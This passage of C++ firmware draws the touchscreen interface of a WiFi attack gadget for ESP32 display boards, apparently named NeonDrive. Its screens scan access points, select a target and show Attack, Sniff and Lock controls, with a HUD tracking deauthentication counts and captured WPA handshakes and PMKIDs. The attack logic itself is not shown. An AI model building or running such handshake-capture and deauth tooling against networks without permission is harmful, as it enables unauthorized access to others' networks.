        return {0x0FFF, 0xC019, 0xF800};  // Bright blue + light purple + red
      }
      case JustGoStage::RUN_MODE: {
        // Active Attack: HOT neon pink + acid lime (MAXIMUM CYBER PUNK!)
        const bool attackPulse = ((now / 100U) & 0x01U) == 0;
        if (attackPulse) return {0xF81F, 0x07E0, 0xFFFF};  // Hot magenta + acid lime + white
        return {0xF81F, 0xFFE0, 0x07FF};  // Hot magenta + yellow + cyan (psychedelic!)
      }
      case JustGoStage::COOLDOWN: {
        // Cooling down: Calm cyan + blue gradient
        if (pulse) return {0x07FF, 0x0C1F, 0x1099};  // Cyan + deep blue + darker blue
        return {0x067F, 0x001F, 0x041F};  // Light blue + navy + darker blue
      }
      default:
        break;
    }
  }
  
  if (screen == ScreenId::TARGET_DETAILS && lockChannel) return {TFT_RED, 0xFBE0, TFT_WHITE};
  const int wifiStatus = WiFi.status();
  if ((screen == ScreenId::WIFI_CONNECT || screen == ScreenId::WIFI_SCAN) && wifiStatus == WL_CONNECTED) {
    return {TFT_GREEN, 0x87F0, TFT_WHITE};
  }
  return {TFT_CYAN, TFT_MAGENTA, TFT_GREEN};
}

static void drawHypercubeWidget(bool clearBg) {
  layoutHypercubeBox();
  const int bx = hypercubeBoxX;
  const int by = hypercubeBoxY;
  const int bw = hypercubeBoxW;
  const int bh = hypercubeBoxH;
  const int cx = bx + (bw / 2);
  const int cy = by + (bh / 2);
  const float scale = (bw < bh ? bw : bh) * 0.23f;

  // Keep the cube visually transparent: redraw backdrop under it, no framed panel.
  if (clearBg) drawCyberBackdropRegion(bx, by, bw, bh);

  const HypercubePalette pal = getHypercubePalette();
  const float a = (float)hypercubeFrame * 0.042f;
  const float b = (float)hypercubeFrame * 0.031f;
  const float c = (float)hypercubeFrame * 0.019f;
  const float ca = cosf(a), sa = sinf(a);
  const float cb = cosf(b), sb = sinf(b);
  const float cc = cosf(c), sc = sinf(c);

  float px[16];
  float py[16];

  // Pre-calc all projected vertices first, then draw lines from this stable set.
  for (int i = 0; i < 16; i++) {
    float x = (i & 1) ? 1.0f : -1.0f;
    float y = (i & 2) ? 1.0f : -1.0f;
    float z = (i & 4) ? 1.0f : -1.0f;
    float w = (i & 8) ? 1.0f : -1.0f;

    float xw = x * ca - w * sa;
    float ww = x * sa + w * ca;
    float yz = y * cb - z * sb;
    float zz = y * sb + z * cb;
    float xx = xw * cc - yz * sc;
    float yy = xw * sc + yz * cc;

    const float p4 = 2.6f / (3.6f - ww);
    const float x3 = xx * p4;
    const float y3 = yy * p4;
    const float z3 = zz * p4;
    const float p3 = 3.4f / (4.2f - z3);

    px[i] = cx + (x3 * p3 * scale);
    py[i] = cy + (y3 * p3 * scale);
  }

  int edgeIdx = 0;
  for (int i = 0; i < 16; i++) {
    for (int bit = 0; bit < 4; bit++) {
      const int j = i ^ (1 << bit);
      if (i < j) {
        const uint16_t col = ((edgeIdx++ & 1) == 0) ? pal.edgeA : pal.edgeB;
        tft.drawLine((int)px[i], (int)py[i], (int)px[j], (int)py[j], col);
      }
    }
  }
  for (int i = 0; i < 16; i++) tft.fillCircle((int)px[i], (int)py[i], 1, pal.node);
}

static void drawCyberBackdrop() {
  const int w = tft.width();
  const int h = tft.height();

  // Dark cyberpunk base across full screen.
  tft.fillRect(0, 0, w, h, TFT_BLACK);

  // Subtle neon grid across full screen.
  for (int y = 0; y < h; y += 16) {
    tft.drawFastHLine(0, y, w, 0x1082); // dim blue-grey
  }
  for (int x = 0; x < w; x += 20) {
    tft.drawFastVLine(x, 0, h, 0x0841);
  }

  // Diagonal accent bands.
  for (int i = -40; i < w; i += 30) {
    tft.drawLine(i, h - 1, i + 50, 0, 0x3006); // dim magenta tone
  }
  // Backdrop is full-screen, so redraw title text on top for every screen.
  drawHeaderTitleOverlay();
  drawHypercubeWidget(false);
}

static void drawHome() {
  tft.fillScreen(TFT_BLACK);
  #if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  drawHeader("NEONDRIVE // T-DISPLAY-S3");
  #elif defined(NEONDRIVE_TARGET_TEMBED)
  drawHeader("NEONDRIVE // T-EMBED-CC1101");
  #else
  drawHeader("NEONDRIVE // CYD");
  #endif
  drawUniversalBackground();

  layoutHome();
  // draw the grid with the fixed neon borders; text and fill thanks to drawButton
  for (int i = 0; i < HOME_BTN_COUNT; ++i) {
    if (homeBtns[i].label == nullptr || homeBtns[i].label[0] == '\0') continue;
    drawButton(homeBtns[i], TFT_BLACK, homeBtnBorderColor(i), TFT_WHITE);
  }

  tft.setTextDatum(BC_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (tft.height() <= 180) {
    tft.drawString("BTN1=Next  BTN2=Select", tft.width() / 2, tft.height() - 6);
  } else {
    tft.drawString("NeonDrive: CYD UI + WiFi scan + target ops", tft.width() / 2, tft.height() - 6);
  }
  drawBorder();
  if (homeReconnectPromptActive) drawHomeReconnectPromptOverlay();
  if (homeTargetsPromptActive) drawHomeTargetsPromptOverlay();
}

static void drawHomeReconnectPromptOverlay() {
  const int w = tft.width();
  const int h = tft.height();
  const int boxW = w - 40;
  const int boxH = 140;
  const int boxX = 20;
  const int boxY = (h - boxH) / 2;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_GREEN);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(2);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Reconnect WiFi?", boxX + 12, boxY + 12);

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String ssid = cfg.wifi_ssid.isEmpty() ? "(none)" : cfg.wifi_ssid;
  if (ssid.length() > 24) ssid = ssid.substring(0, 21) + "...";
  tft.drawString("Last: " + ssid, boxX + 12, boxY + 52);
  tft.drawString("Connect now?", boxX + 12, boxY + 66);

  btnHomePromptNo  = {boxX + 12, boxY + boxH - 52, 110, 40, "No"};
  btnHomePromptYes = {boxX + boxW - 122, boxY + boxH - 52, 110, 40, "Yes"};
  drawButton(btnHomePromptNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnHomePromptYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  drawBorder();
}



static void drawHomeTargetsPromptOverlay() {
  const int w = tft.width();
  const int h = tft.height();

  // Modal box
  const int boxW = w - 40;
  const int boxH = 140;
  const int boxX = 20;
  const int boxY = (h - boxH) / 2;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_CYAN);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(2);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("No scan data", boxX + 12, boxY + 12);

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Run a WiFi scan now?", boxX + 12, boxY + 52);

  btnHomePromptNo  = {boxX + 12, boxY + boxH - 52, 110, 40, "No"};
  btnHomePromptYes = {boxX + boxW - 122, boxY + boxH - 52, 110, 40, "Yes"};

  drawButton(btnHomePromptNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnHomePromptYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Targets needs scan results", boxX + 12, boxY + boxH - 64);

  drawBorder();
}

static void drawPlaceholder(const char* title, const char* msg) {
  tft.fillScreen(TFT_BLACK);
  drawHeader(title);
  drawUniversalBackground();

  tft.setTextDatum(MC_DATUM);
  tft.setTextSize(2);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(msg, tft.width() / 2, tft.height() / 2);

  btnBack = {10, tft.height() - 50, 120, 40, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  drawBorder();
}


static void drawWifiRow(int idx, int y, bool selected) {
  const int listX = 8;
  const int listW = max(120, hypercubeBoxX - listX);
  const uint16_t bg = selected ? TFT_DARKGREEN : TFT_BLACK;
  const uint16_t fg = selected ? TFT_BLACK : TFT_WHITE;

  tft.fillRect(listX, y, listW, wifiRowH - 2, bg);
  tft.drawRect(listX, y, listW, wifiRowH - 2, TFT_DARKGREY);

  if (idx < 0 || idx >= apCount) return;

  const ApRecord& a = aps[idx];

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(fg, bg);

  const int line1Y = y + ((wifiRowH >= 32) ? 4 : 2);
  const int line2Y = y + ((wifiRowH >= 32) ? 18 : 13);

  // Line 1: SSID + RSSI
  char line1[64];
  snprintf(line1, sizeof(line1), "%s  (%ddBm)", a.ssid.c_str(), a.rssi);
  tft.drawString(line1, listX + 4, line1Y);

  // Line 2: CH + SEC + BSSID
  char line2[80];
  snprintf(line2, sizeof(line2), "CH %d  %s  %s", a.channel, authToStr(a.auth), a.bssid.c_str());
  tft.drawString(line2, listX + 4, line2Y);
}


static void drawWifiConfirmOverlay() {
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);

  // Dim background
  tft.fillRect(0, 34, w, h - 34, TFT_BLACK);

  // Modal box
  const int boxW = ((w - 40) * 9) / 10;
  const int boxH = compact ? 98 : (140 * 9) / 10;
  const int boxX = (w - boxW) / 2;
  int boxY = (h - boxH) / 2;
  const int minBoxY = hypercubeReservedBottomY + 8;
  if (boxY < minBoxY) boxY = minBoxY;
  const int maxBoxY = h - boxH - 4;
  if (boxY > maxBoxY) boxY = maxBoxY;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_MAGENTA);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(compact ? 1 : 2);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Set Target?", boxX + 12, boxY + 12);

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  
  // Display pending target details
  tft.drawString(String("SSID: ") + pendingTarget.ssid, boxX + 12, boxY + (compact ? 30 : 44));
  char line2[96];
  snprintf(line2, sizeof(line2), "CH: %d  RSSI: %ddBm  SEC: %s", pendingTarget.channel, pendingTarget.rssi, authToStr(pendingTarget.auth));
  tft.drawString(line2, boxX + 12, boxY + (compact ? 44 : 60));

  // Buttons
  const int btnW = compact ? 84 : 110;
  const int btnH = compact ? 28 : 40;
  btnWifiNo  = {boxX + 12, boxY + boxH - (btnH + 10), btnW, btnH, "No"};
  btnWifiYes = {boxX + boxW - (btnW + 12), boxY + boxH - (btnH + 10), btnW, btnH, "Yes"};

  drawButton(btnWifiNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  // Footer hint
  tft.setTextDatum(BC_DATUM);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("tap Yes to open Target Ops", w / 2, boxY + boxH - 3);

  drawBorder();
}

static void drawConfirmTarget() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Confirm Target");
  drawUniversalBackground();
  
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);

  // Modal box
  const int boxW = ((w - 40) * 9) / 10;
  const int boxH = compact ? 98 : (140 * 9) / 10;
  const int boxX = (w - boxW) / 2;
  int boxY = (h - boxH) / 2;
  const int minBoxY = hypercubeReservedBottomY + 8;
  if (boxY < minBoxY) boxY = minBoxY;
  const int maxBoxY = h - boxH - 4;
  if (boxY > maxBoxY) boxY = maxBoxY;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_MAGENTA);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(compact ? 1 : 2);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Proceed to Target?", boxX + 12, boxY + 12);

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  if (hasTarget) {
    tft.drawString(String("SSID: ") + target.ssid, boxX + 12, boxY + (compact ? 30 : 44));
    char line2[96];
    snprintf(line2, sizeof(line2), "CH: %d  RSSI: %ddBm  SEC: %s", target.channel, target.rssi, authToStr(target.auth));
    tft.drawString(line2, boxX + 12, boxY + (compact ? 44 : 60));
  } else {
    tft.drawString("No target selected.", boxX + 12, boxY + (compact ? 36 : 50));
  }

  // Buttons
  const int btnW = compact ? 84 : 110;
  const int btnH = compact ? 28 : 40;
  btnWifiNo  = {boxX + 12, boxY + boxH - (btnH + 10), btnW, btnH, "No"};
  btnWifiYes = {boxX + boxW - (btnW + 12), boxY + boxH - (btnH + 10), btnW, btnH, "Yes"};

  drawButton(btnWifiNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  drawBorder();
}

static void drawWifiScan() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("WiFi Scan");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  // Bottom controls on the left: Back / Scan / Stop.
  const int btnGap = compact ? 4 : 8;
  const int btnH = compact ? 24 : 30;
  const int btnY = h - (compact ? 30 : 36);
  const int btnX0 = 8;
  const int leftControlW = max(compact ? 164 : 180, hypercubeBoxX - 16);
  const int btnW = max(56, (leftControlW - (btnGap * 2)) / 3);
  btnWifiBack = {btnX0 + (btnW + btnGap) * 0, btnY, btnW, btnH, "Back"};
  btnWifiScan = {btnX0 + (btnW + btnGap) * 1, btnY, btnW, btnH, "Scan"};
  btnWifiStop = {btnX0 + (btnW + btnGap) * 2, btnY, btnW, btnH, "Stop"};

  // Square scroll buttons under the hypercube.
  const int scrollBtn = clampi(hypercubeBoxW, compact ? 18 : 22, compact ? 24 : 30);
  int scrollTopY = hypercubeReservedBottomY + 8;
  const int scrollGap = 6;
  if (scrollTopY + (scrollBtn * 2) + scrollGap > btnY - 4) {
    scrollTopY = btnY - 4 - ((scrollBtn * 2) + scrollGap);
  }
  const int scrollX = hypercubeBoxX + ((hypercubeBoxW - scrollBtn) / 2);
  btnWifiUp   = {scrollX, scrollTopY, scrollBtn, scrollBtn, "^"};
  btnWifiDown = {scrollX, scrollTopY + scrollBtn + scrollGap, scrollBtn, scrollBtn, "v"};

  drawButton(btnWifiBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiScan, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnWifiStop, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  uiLogButtonRect("WifiScan.Back", btnWifiBack);
  uiLogButtonRect("WifiScan.Scan", btnWifiScan);
  uiLogButtonRect("WifiScan.Stop", btnWifiStop);
  uiLogButtonRect("WifiScan.Up", btnWifiUp);
  uiLogButtonRect("WifiScan.Down", btnWifiDown);

  // AP list on the left; right border aligned to hypercube left edge.
  const int wifiListXLocal = 8;
  const int wifiListWLocal = max(120, hypercubeBoxX - wifiListXLocal);

  // Top layout bands (avoid overlaps): title -> selected -> status -> hint -> list.
  const int selectedY = compact ? (hypercubeReservedBottomY + 2) : 24;
  const int statusY = selectedY + 12;
  const int hintY = statusY + 12;
  wifiListTopY = hintY + 14;
  wifiListBottomY = btnY - 6;
  const int availRowsH = wifiListBottomY - wifiListTopY;
  wifiRowH = clampi(availRowsH / 4, compact ? 16 : 20, compact ? 24 : 30);  // Keep 4 visible rows.

  // Status line
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (wifiIsScanning) {
    tft.drawString("Scanning...", wifiListXLocal, statusY);
    tft.drawString("Please wait...", wifiListXLocal, hintY);
  } else {
    char st[48];
    snprintf(st, sizeof(st), "APs: %d", apCount);
    tft.drawString(st, wifiListXLocal, statusY);
    tft.drawString("Tap row to select target", wifiListXLocal, hintY);
  }

  // Draw visible rows (fixed count)
  const int maxRows = min(4, (wifiListBottomY - wifiListTopY) / wifiRowH);
  for (int r = 0; r < maxRows; r++) {
    int idx = apScroll + r;
    int y = wifiListTopY + r * wifiRowH;
    bool sel = (idx == apSelected);
    btnWifiRows[r] = {wifiListXLocal, y, wifiListWLocal, wifiRowH - 2, "AP"};
    if (idx < apCount) drawWifiRow(idx, y, sel);
    else {
      // blank row
      tft.fillRect(wifiListXLocal, y, wifiListWLocal, wifiRowH - 2, TFT_BLACK);
      tft.drawRect(wifiListXLocal, y, wifiListWLocal, wifiRowH - 2, TFT_DARKGREY);
    }
  }
  for (int r = maxRows; r < 4; r++) {
    btnWifiRows[r] = {0, 0, 0, 0, ""};
  }

  // Selected line directly under title text.
  tft.fillRect(0, selectedY - 2, w, 14, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  const int selectedMaxW = hypercubeBoxX - 12;
  String selectedLine = "Selected: (none)";
  if (apSelected >= 0 && apSelected < apCount) {
    const ApRecord& a = aps[apSelected];
    selectedLine = "Selected: " + (a.ssid.isEmpty() ? String("(hidden)") : a.ssid) +
                   " | CH " + String(a.channel) + " | " + String(a.rssi) + "dBm";
  }
  if (selectedMaxW > 20) {
    bool trimmed = false;
    while (selectedLine.length() > 4 && tft.textWidth(selectedLine) > selectedMaxW) {
      selectedLine.remove(selectedLine.length() - 1);
      trimmed = true;
    }
    if (trimmed && selectedLine.length() > 3) selectedLine += "...";
    while (selectedLine.length() > 4 && tft.textWidth(selectedLine) > selectedMaxW) {
      selectedLine.remove(selectedLine.length() - 1);
    }
  }
  tft.drawString(selectedLine, 8, selectedY);

  UiRect bottom = computeBottomBarRect();
  UiRect content = computeContentRect();
  uiLogLayout("drawWifiScan", content, bottom);
  drawBorder();
}

static bool isBlockingPopupActive() {
  if (homeReconnectPromptActive || homeTargetsPromptActive) return true;
  if (screen == ScreenId::WIFI_CONNECT && wifiConnectShowPasswordModal) return true;
  return false;
}

static void hypercubeAnimTick() {
  if (isBlockingPopupActive()) return;
  const uint32_t now = millis();
  if (now - hypercubeLastTickMs < 85) return;
  hypercubeLastTickMs = now;
  hypercubeFrame++;
  drawHypercubeWidget(true);
  drawCompanionSyncBadgeTick();
}


static void drawTargetDetails() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Target Ops");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const UiRect bottom = computeBottomBarRect();

  if (compact) {
    const UiRect content = computeContentRect();
    const int gap = 4;

    // Pull target summary near the title/hypercube band on compact displays.
    const int targetBoxY = content.y + 2;
    const int targetBoxH = 30;
    const int btnY = targetBoxY + targetBoxH + gap;
    const int btnH = 22;

    const int actionX = content.x;
    const int actionW = w - (content.x * 2);
    const int backW = 56;
    const int monitorW = 70;
    const int lockW = 64;
    int attackW = actionW - backW - monitorW - lockW - (gap * 3);
    if (attackW < 56) attackW = 56;

    btnTargetBack = {actionX, btnY, backW, btnH, "Back"};
    btnTargetAutomate = {actionX + backW + gap, btnY, attackW, btnH, "Attack"};
    btnTargetMonitor = {actionX + backW + gap + attackW + gap, btnY, monitorW, btnH, "Monitor"};
    btnTargetLock = {actionX + backW + gap + attackW + gap + monitorW + gap, btnY, lockW, btnH,
                     lockChannel ? "LOCKED" : "LOCK"};
    btnTargetSniff = {bottom.x, bottom.y, bottom.w, UI_BUTTON_H, sniffActive ? "Stop Sniff" : "Start Sniff"};

    int hudY = btnY + btnH + gap;
    int hudH = bottom.y - hudY - 3;
    if (hudH < 18) hudH = 18;

    drawButton(btnTargetBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);
    drawButton(btnTargetAutomate, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);
    drawButton(btnTargetMonitor, TFT_NAVY, TFT_MAGENTA, TFT_WHITE);
    drawButton(btnTargetLock, lockChannel ? TFT_RED : TFT_DARKGREY, TFT_CYAN, TFT_WHITE);
    drawButton(btnTargetSniff, sniffActive ? TFT_MAROON : TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

    // Target summary box (moved up).
    tft.drawRect(content.x, targetBoxY, content.w, targetBoxH, TFT_MAGENTA);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(lockChannel ? TFT_RED : TFT_CYAN, TFT_BLACK);
    tft.drawString(lockChannel ? "TARGET LOCKED" : "TARGET", content.x + 4, targetBoxY + 2);

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char line[128];
    if (hasTarget) {
      String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
      while (ssid.length() > 4 && tft.textWidth("SSID: " + ssid) > (content.w - 8)) {
        ssid.remove(ssid.length() - 1);
      }
      snprintf(line, sizeof(line), "SSID: %s", ssid.c_str());
      tft.drawString(line, content.x + 4, targetBoxY + 12);
      snprintf(line, sizeof(line), "CH:%d RSSI:%ddBm %s",
               target.channel, target.rssi, authToStr(target.auth));
      tft.drawString(line, content.x + 4, targetBoxY + 22);
    } else {
      tft.drawString("No target selected.", content.x + 4, targetBoxY + 16);
    }

    // Compact HUD box.
    tft.drawRect(content.x, hudY, content.w, hudH, TFT_CYAN);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("HUD", content.x + 4, hudY + 2);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);

    if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
      snprintf(line, sizeof(line), "Y0INK %s CH:%d NET:%d",
               YoinkEngine::getStateStr(),
               YoinkEngine::getCurrentChannel(),
               YoinkEngine::getNetworkCount());
      tft.drawString(line, content.x + 4, hudY + 12);
      snprintf(line, sizeof(line), "HS:%d PMK:%d CL:%d",
               YoinkEngine::getHandshakeCount(),
               YoinkEngine::getPmkidCount(),
               YoinkEngine::getClientCount());
      tft.drawString(line, content.x + 4, hudY + 22);
    } else if (sniffActive) {
      snprintf(line, sizeof(line), "mode:%s sniff:ON pps:%d",
               autoModeStr(autoMode), sniffPps);
      tft.drawString(line, content.x + 4, hudY + 12);
      snprintf(line, sizeof(line), "pkts:%lu lock:%s ch:%d",
               (unsigned long)sniffPacketCount,
               lockChannel ? "ON" : "OFF",
               hasTarget ? target.channel : -1);
      tft.drawString(line, content.x + 4, hudY + 22);
    } else {
      snprintf(line, sizeof(line), "sniff:OFF mode:%s", autoModeStr(autoMode));
      tft.drawString(line, content.x + 4, hudY + 12);
      snprintf(line, sizeof(line), "lock:%s ch:%d",
               lockChannel ? "ON" : "OFF",
               hasTarget ? target.channel : -1);
      tft.drawString(line, content.x + 4, hudY + 22);
    }

    drawBorder();
    return;
  }

  const int topBtnY = compact ? (hypercubeReservedBottomY + 2) : 40;
  const int topGap = compact ? 4 : 6;
  const int topBtnH = compact ? 24 : 30;
  const int actionX = 10;
  const int lockW = compact ? 68 : 78;
  const int lockX = w - 10 - lockW;
  const int actionAreaW = max(120, lockX - actionX - topGap);
  const int backW = compact ? 58 : 66;
  const int monitorW = compact ? 68 : 76;
  const int autoW = max(compact ? 64 : 72, actionAreaW - backW - monitorW - (topGap * 2));

  btnTargetBack = {actionX, topBtnY, backW, topBtnH, "Back"};
  btnTargetAutomate = {actionX + backW + topGap, topBtnY, autoW, topBtnH, "Attack"};
  btnTargetMonitor = {actionX + backW + topGap + autoW + topGap, topBtnY, monitorW, topBtnH, "Monitor"};
  btnTargetLock = {lockX, topBtnY, lockW, topBtnH, lockChannel ? "LOCKED" : "LOCK"};
  btnTargetSniff = {bottom.x, bottom.y, bottom.w, UI_BUTTON_H, sniffActive ? "Stop Sniff" : "Start Sniff"};

  int targetBoxY = topBtnY + topBtnH + 4;
  int targetBoxH = compact ? 40 : ((h <= 240) ? 70 : 92);
  int hudY = targetBoxY + targetBoxH + 4;
  int hudH = bottom.y - hudY - 4;
  const int minHudH = compact ? 20 : 36;
  if (hudH < minHudH) {
    const int need = minHudH - hudH;
    targetBoxH = max(compact ? 24 : 48, targetBoxH - need);
    hudY = targetBoxY + targetBoxH + 4;
    hudH = bottom.y - hudY - 4;
  }

  // Neon button palette
  drawButton(btnTargetBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);
  drawButton(btnTargetAutomate, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnTargetMonitor, TFT_NAVY, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnTargetLock, lockChannel ? TFT_RED : TFT_DARKGREY, TFT_CYAN, TFT_WHITE);
  drawButton(btnTargetSniff, sniffActive ? TFT_MAROON : TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  // Target info panel
  tft.drawRect(10, targetBoxY, w - 20, targetBoxH, TFT_MAGENTA);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(compact ? 1 : 2);
  tft.setTextColor(lockChannel ? TFT_RED : TFT_CYAN, TFT_BLACK);
  tft.drawString(lockChannel ? "TARGET LOCKED" : "TARGET", 16, targetBoxY + 6);

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  if (hasTarget) {
    char line[128];
    if (compact) {
      String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
      if (ssid.length() > 18) ssid = ssid.substring(0, 15) + "...";
      snprintf(line, sizeof(line), "SSID: %s", ssid.c_str());
      tft.drawString(line, 16, targetBoxY + 18);
      snprintf(line, sizeof(line), "CH:%d RSSI:%ddBm %s",
               target.channel, target.rssi, authToStr(target.auth));
      tft.drawString(line, 16, targetBoxY + 30);
    } else {
      snprintf(line, sizeof(line), "SSID: %s", target.ssid.c_str());
      tft.drawString(line, 16, targetBoxY + 28);

      snprintf(line, sizeof(line), "BSSID: %s", target.bssid.c_str());
      tft.drawString(line, 16, targetBoxY + 42);

      snprintf(line, sizeof(line), "CH: %d   RSSI: %ddBm   SEC: %s",
               target.channel, target.rssi, authToStr(target.auth));
      tft.drawString(line, 16, targetBoxY + 56);
    }
  } else {
    tft.drawString("No target selected.", 16, targetBoxY + (compact ? 22 : 32));
  }

  // HUD / Stats
  tft.drawRect(10, hudY, w - 20, hudH, TFT_CYAN);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("HUD", 16, hudY + 6);

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (compact && autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
    char hud[96];
    snprintf(hud, sizeof(hud), "Y0INK %s CH:%d NET:%d",
             YoinkEngine::getStateStr(),
             YoinkEngine::getCurrentChannel(),
             YoinkEngine::getNetworkCount());
    tft.drawString(hud, 16, hudY + 16);
    snprintf(hud, sizeof(hud), "HS:%d PMK:%d CL:%d",
             YoinkEngine::getHandshakeCount(),
             YoinkEngine::getPmkidCount(),
             YoinkEngine::getClientCount());
    tft.drawString(hud, 16, hudY + 28);
  } else if (compact && sniffActive) {
    char hud[96];
    snprintf(hud, sizeof(hud), "mode:%s sniff:ON pps:%d",
             autoModeStr(autoMode), sniffPps);
    tft.drawString(hud, 16, hudY + 16);
    snprintf(hud, sizeof(hud), "pkts:%lu ch:%d lock:%s",
             (unsigned long)sniffPacketCount,
             hasTarget ? target.channel : -1,
             lockChannel ? "ON" : "OFF");
    tft.drawString(hud, 16, hudY + 28);
  } else if (compact) {
    char hud[96];
    snprintf(hud, sizeof(hud), "sniff:OFF mode:%s", autoModeStr(autoMode));
    tft.drawString(hud, 16, hudY + 16);
    snprintf(hud, sizeof(hud), "lock:%s ch:%d",
             lockChannel ? "ON" : "OFF",
             hasTarget ? target.channel : -1);
    tft.drawString(hud, 16, hudY + 28);
  } else if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
    // === YOINK ENGINE HUD ===
    char hud[128];
    snprintf(hud, sizeof(hud), "STATE: %s  CH:%d  NETS:%d",
             YoinkEngine::getStateStr(),
             YoinkEngine::getCurrentChannel(),
             YoinkEngine::getNetworkCount());
    tft.drawString(hud, 16, hudY + 6);

    const char* tgtSsid = YoinkEngine::getTargetSSID();
    if (tgtSsid && tgtSsid[0]) {
      snprintf(hud, sizeof(hud), "TGT: %s  RSSI:%d  AUTH:%s",
               tgtSsid, YoinkEngine::getTargetRSSI(),
               YoinkEngine::getTargetAuthStr());
    } else {
      snprintf(hud, sizeof(hud), "TGT: (scanning...)");
    }
    tft.drawString(hud, 16, hudY + 18);

    snprintf(hud, sizeof(hud), "CLIENTS:%d  DEAUTHS:%lu  PKTS:%lu",
             YoinkEngine::getClientCount(),
             (unsigned long)YoinkEngine::getDeauthCount(),
             (unsigned long)YoinkEngine::getPacketCount());
    tft.drawString(hud, 16, hudY + 30);

    // EAPOL progress: M1-M4 indicators
    uint8_t mask = YoinkEngine::getEapolMask();
    snprintf(hud, sizeof(hud), "EAPOL: M1%s M2%s M3%s M4%s  HS:%d  PMKID:%d",
             (mask & 0x01) ? "[Y]" : "[-]",
             (mask & 0x02) ? "[Y]" : "[-]",
             (mask & 0x04) ? "[Y]" : "[-]",
             (mask & 0x08) ? "[Y]" : "[-]",
             YoinkEngine::getHandshakeCount(),
             YoinkEngine::getPmkidCount());
    tft.drawString(hud, 16, hudY + 42);
  } else if (sniffActive) {
    uint32_t up = (millis() - sniffStartMs) / 1000UL;
